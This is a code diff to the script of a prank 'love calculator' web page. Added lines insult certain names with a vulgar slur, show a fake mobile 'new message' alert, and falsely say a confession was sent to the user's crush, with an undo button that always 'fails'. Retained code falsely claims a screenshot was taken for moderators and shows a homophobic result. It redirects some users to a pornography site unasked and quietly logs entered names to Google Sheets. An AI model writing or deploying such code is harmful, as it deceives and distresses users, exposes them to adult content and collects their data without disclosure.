@@ -68,6 +68,21 @@
 
     const yourName = document.getElementById("yourName").value.trim();
     const crushName = document.getElementById("crushName").value.trim();
+    const combinedInput = (yourName + " " + crushName).toLowerCase();
+
+    // 🧼 Name block for "leonard", "affan", "ruby", "flamingo"
+    const blockedNames = ["leonard", "affan", "ruby", "flamingo"];
+    if (blockedNames.some(name => combinedInput.includes(name))) {
+      resultDiv.innerHTML = `<span style="color:red;font-weight:bold;">THIS IS A LOVE CALCULATOR CHEEBYE, NOT FOR YOU TO CALCULATE POKEMON CHANCES</span>`;
+      return;
+    }
+
+    // 🎯 Mobile-only fake notification
+    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
+      setTimeout(() => {
+        alert(`💬 New message from ${crushName}`);
+      }, 1800);
+    }
 
     const rng = Math.floor(Math.random() * 100) + 1; // 1–100
     let lovePercent = Math.floor(Math.random() * 51) + 50; // 50–100%
@@ -75,12 +90,20 @@
 
     resultDiv.innerHTML = resultText;
 
-    // Always show fake screenshot warning after 1.5s
+    // 📸 Always show fake screenshot warning after 1.5s
     setTimeout(() => {
       resultDiv.innerHTML += `<br><br>📸 Screenshot captured for verification purposes.<br><i>(This may be reviewed by our moderators)</i>`;
     }, 1500);
 
-    // 1% chance for glitch curse effect
+    // 📨 Fake "confession sent" + undo
+    setTimeout(() => {
+      resultDiv.innerHTML += `<br><br>📨 Your confession has been sent anonymously to <b>${crushName}</b>.<br><button id="undoBtn">Undo</button>`;
+      document.getElementById("undoBtn").addEventListener("click", () => {
+        resultDiv.innerHTML += `<br><span style="color:gray;">⏳ Attempting to cancel... ❌ Failed to undo submission.</span>`;
+      });
+    }, 2000);
+
+    // 💀 1% chance for glitch curse effect
     const glitchRoll = Math.floor(Math.random() * 100) + 1;
     if (glitchRoll === 1) {
       setTimeout(() => {
@@ -96,7 +119,7 @@
       return;
     }
 
-    // Prank logic if rng < 50
+    // 🧠 Prank logic if rng < 50
     if (rng < 50) {
       setTimeout(() => {
         const prankRoll = Math.random(); // 0–1
@@ -106,7 +129,7 @@
           resultText = `💔 ${yourName} & ${crushName} are <b>0%</b> in love – the person you like is a <b>GAY!!!</b>`;
           resultDiv.innerHTML = resultText;
         } else if (prankRoll < 0.5) {
-          // Porn Star prank with "here" link and redirect
+          // Porn Star prank with redirect
           resultDiv.innerHTML += `<br><br>🔍 We found something online…<br><b>Your hidden crush is a porn star.</b><br>Here’s the link: <a href="#">here</a>`;
           setTimeout(() => {
             window.location.href = "https://www.spankbang.com";
@@ -126,7 +149,7 @@
       }, 2000);
     }
 
-    // Log to Google Sheets regardless
+    // ✅ Log to Google Sheets regardless
     const formData = new URLSearchParams();
     formData.append("yourName", yourName);
     formData.append("crushName", crushName);
@@ -141,6 +164,7 @@
     .catch(err => console.error("❌ Logging failed:", err));
   });
 </script>
+
 
 
 
